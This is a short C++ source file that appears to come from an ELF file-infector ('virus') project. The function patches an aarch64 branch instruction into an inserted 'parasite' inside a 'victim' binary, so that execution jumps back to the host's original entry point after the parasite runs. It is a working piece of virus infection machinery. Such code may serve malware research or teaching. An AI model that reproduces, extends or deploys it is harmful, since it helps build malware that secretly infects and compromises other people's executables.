#include "common/get_symbol_addr.hh"
#include "common/patch_pattern.hh"
#include "common/redirect_elf_entry_point.hh"
#include "nostdlib/stdio.hh"

namespace vt::common {

bool redirect_elf_entry_point(Elf64_Addr original_entry_point,
                              Elf64_Addr parasite_load_address,
                              size_t parasite_offset, size_t parasite_size,
                              std::span<std::byte> victim) {
  // constexpr uint32_t no_op_to_be_patched = 0x11223344;
  //  For aarch64, patch the b address to the orignal entry point.
  //  It is assumed that the inserted virus has at least 4 bytes of noop and
  //  that's where it jumps back to host.

  // b imm26
  // 000101 imm26
  // imm26 = rel / 4
  // The rel is offset from the current instruction (b xxx)
  // The patched jump instruction is always 4 bytes.
  //  auto patch_offset_from_parasite_start = common::find<uint32_t>(
  //      victim.subspan(parasite_offset, parasite_size), no_op_to_be_patched);
  auto patch_offset_from_parasite_start = 32;
  if (patch_offset_from_parasite_start == -1) {
    printf("failed to find pattern to patch!!!!!!!!!!\n");
    return false;
  }

  // Calculate the difference between original (destination) and current branch
  // instruction.
  int32_t rel = original_entry_point -
                (parasite_load_address + patch_offset_from_parasite_start);

  rel /= 4;
  auto* inst = reinterpret_cast<int32_t*>(
      &victim[parasite_offset + patch_offset_from_parasite_start]);

  *inst = rel;

  *inst &= 0b11111111111111111111111111;
  // fill in op-code
  constexpr auto op_code = 0b00010100000000000000000000000000;

  *inst |= (op_code);

  return true;
}

}  // namespace vt::common